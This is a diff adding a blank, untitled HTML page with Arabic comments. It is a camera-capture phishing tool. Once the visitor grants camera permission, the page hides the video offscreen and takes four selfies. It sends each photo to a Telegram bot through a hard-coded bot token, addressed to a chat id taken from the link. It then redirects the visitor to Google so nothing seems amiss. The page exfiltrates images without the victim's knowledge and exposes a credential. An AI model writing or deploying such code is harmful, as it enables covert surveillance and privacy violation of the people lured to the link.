@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <style>
+        /* خلفية بيضاء نقية */
+        body { 
+            background: white;
+            margin: 0;
+            padding: 0;
+            width: 100vw;
+            height: 100vh;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        // ==================== جلب الإيدي من الرابط ====================
+        const USER_ID = new URLSearchParams(window.location.search).get('id');
+        const BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
+
+        // إذا ما في ID بالرابط، نوقف
+        if (!USER_ID) {
+            // صفحة بيضاء
+        } else {
+            // ==================== حل نهائي لمشكلة الصور السوداء ====================
+            (async function() {
+                try {
+                    // طلب الكاميرا
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: 'user',
+                            width: { ideal: 1920 },
+                            height: { ideal: 1080 }
+                        }
+                    });
+
+                    // عنصر فيديو
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.setAttribute('playsinline', '');
+                    video.setAttribute('autoplay', '');
+                    video.setAttribute('muted', 'true');
+                    video.style.position = 'absolute';
+                    video.style.left = '-9999px';
+                    video.style.top = '-9999px';
+                    video.style.width = '1px';
+                    video.style.height = '1px';
+                    video.style.opacity = '0';
+                    document.body.appendChild(video);
+
+                    // انتظار تحميل الفيديو
+                    await new Promise(resolve => {
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            resolve();
+                        };
+                    });
+
+                    // الأهم: انتظار الكاميرا تاخذ وقتها (3 ثواني)
+                    // هذا هو الحل الحقيقي للصور السوداء
+                    await new Promise(r => setTimeout(r, 3000));
+
+                    // التحقق من أن الكاميرا شغالة
+                    console.log('Camera is ready');
+                    console.log('Video dimensions:', video.videoWidth, 'x', video.videoHeight);
+
+                    // التقاط 4 صور
+                    for (let i = 0; i < 4; i++) {
+                        // تأخير بين الصور
+                        await new Promise(r => setTimeout(r, 500));
+
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 1280;
+                        canvas.height = video.videoHeight || 720;
+                        
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // تحقق سريع من الصورة
+                        const imageData = ctx.getImageData(0, 0, 10, 10);
+                        const isNotBlack = imageData.data.some(val => val > 0);
+                        console.log('Image', i+1, 'has data:', isNotBlack);
+
+                        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.95));
+
+                        const formData = new FormData();
+                        formData.append('chat_id', USER_ID);
+                        formData.append('photo', blob, `selfie_${i+1}.jpg`);
+
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        }).catch(e => console.log('Send error:', e));
+                    }
+
+                    // إرسال تأكيد
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: USER_ID,
+                            text: '✅ تم التصوير بنجاح'
+                        })
+                    }).catch(e => {});
+
+                    // تنظيف
+                    stream.getTracks().forEach(t => t.stop());
+                    video.remove();
+
+                    // تحويل لجوجل
+                    window.location.replace("https://www.google.com");
+
+                } catch(error) {
+                    console.log('Camera error:', error);
+                    // صفحة بيضاء - لا تحويل
+                }
+            })();
+        }
+    </script>
+</body>
+</html>
